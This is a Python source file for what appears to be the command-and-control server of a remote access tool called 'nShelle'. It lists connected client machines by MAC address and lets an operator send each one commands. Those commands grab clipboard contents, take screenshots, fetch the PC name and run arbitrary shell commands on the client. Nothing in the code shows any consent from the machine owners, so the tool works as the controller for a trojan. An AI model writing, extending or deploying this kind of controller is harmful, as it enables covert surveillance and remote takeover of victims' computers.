import socket
import threading
import sys
import os

from rich.console import Console
from art import tprint
from struct import unpack

console = Console()

class Server:
    def __init__(self, host, port):
        self.host = host
        self.port = int(port) if port.isnumeric() else None
        if self.port == None:
            raise Exception("Port is invalid")

        self.currentConnections = 0
        self.connectionList = {}
        self.currentConnection = None

    def start(self):
        serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        serverSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        serverSocket.settimeout(10000)
        serverSocket.bind((self.host, self.port))
        serverSocket.listen(100)
        
        while True:
            conn, addr = serverSocket.accept()
            macAddress = ""
            if conn:
                macAddressLen = unpack("<i", conn.recv(4))[0]
                macAddress = conn.recv(macAddressLen).decode("utf-8")
                if macAddress:
                    if macAddress not in self.connectionList:
                        self.connectionList[macAddress] = conn

    def recvData(self, connection):
        dataLen = unpack("<i", connection.recv(4))[0]
        data = connection.recv(dataLen, socket.MSG_WAITALL).decode("utf-8", errors="replace")
        return data

    def showHelpCommand(self):
        console.print(
                    "\n"\
                    "Available server commands:\n"\
                    "------------------------------------------------------------------------\n"\
                    "[yellow]help[/], [yellow]h[/]                                         Shows available commands\n"\
                    "[yellow]clients[/]                                      Shows all available clients\n"\
                    "[yellow]connect <ID>[/], [yellow]c <ID>[/]                             Connect to client by ID\n"\
                    "------------------------------------------------------------------------\n"\
                    "\n"\
                    "Available commands per client:\n"\
                    "------------------------------------------------------------------------\n"\
                    "[yellow]quit[/]                                      Disconnects current connection\n"\
                    "[yellow]getClipboard[/]                        Get current clipboard data as string\n"\
                    "[yellow]whoami[/]                                                       Get PC name\n"\
                    "[yellow]screenshot[/]                             Take a screenshot from the client\n"\
                    "[yellow]shell[/]                                   Execute a command from the shell\n"\
                    "------------------------------------------------------------------------\n"\
                    )

    def showCurrentConnections(self):
        count = 0
        if self.connectionList:
            for key in self.connectionList:
                count += 1
                print("{}) {}".format(count,key))

        else:
            console.print("No clients are currently connected")

    def control(self, id):
        try:
            # get connection by index provided by user
            connection = list(self.connectionList.values())[id-1]
            self.currentConnection = connection
            
            while True:
                commandClient = input("Client " + str(id) + "> ").strip()
                self.currentConnection.send(bytes(commandClient, "utf-8"))
                
                # different commands require different ways of waiting for an answer
                if commandClient == "exit":
                    break
                elif commandClient == "quit":
                    del self.connectionList[list(self.connectionList.keys())[id-1]]
                    break
                elif commandClient == "whoami":
                    console.print("The computers name is:", self.recvData(self.currentConnection))
                elif commandClient == "getClipboard":
                    console.print(self.recvData(self.currentConnection))
                elif commandClient == "screenshot":
                    console.print(self.recvData(self.currentConnection))
                elif commandClient.startswith("shell"):
                    console.print(self.recvData(self.currentConnection))
                elif commandClient == "":
                    pass
                else:
                    console.print("[red]Failed to parse command[/]")

        except IndexError:
            console.print("[red]Error. Please provide a valid index[/]")
        except (ConnectionResetError, ConnectionAbortedError):
            console.print("[red]Client disconnected because of a shutdown or error[/]")
            del self.connectionList[list(self.connectionList.keys())[id-1]]

if __name__ == "__main__":
    try:
        if len(sys.argv) != 3:
            raise Exception("Correct use: main.py [Host] [Port]")

        # start server thread and set daemon=True so the thread quits when user uses keyboard interrupt
        server = Server(sys.argv[1], sys.argv[2])
        serverThread = threading.Thread(target=server.start)
        serverThread.daemon = True
        serverThread.start()

        # some pretty stuff
        os.system("cls")
        console.print()
        tprint("nShelle")
        console.print("Server has [green]started[/] and is now listening for connections")
        console.print("Type [yellow]help[/] or [yellow]h[/] for a list of commands")

        while True:
            commandInput = input("nShelle> ").lower().strip()
            commandInputSplit = commandInput.split(" ")

            # handle user input
            if commandInput == "help" or commandInput == "h":
                server.showHelpCommand()
            elif commandInput == "clients":
                server.showCurrentConnections()

            elif commandInputSplit[0] == "connect" or commandInputSplit[0] == "c":
                if len(commandInputSplit) == 2 and commandInputSplit[1].isnumeric():
                    server.control(int(commandInputSplit[1]))
                else:
                    console.print("[red]Error. See to the help command for more info on the usage[/]")

            else:
                if(commandInput != ""):
                    console.print("[red]Error. No command found under[/]", commandInput)

    except KeyboardInterrupt:
        for connection in list(server.connectionList.values()):
            connection.send(bytes("quit", "utf-8"))
        os._exit(0)

    except Exception as e:
        print(e)
        for connection in list(server.connectionList.values()):
            connection.send(bytes("quit", "utf-8"))
        os._exit(0)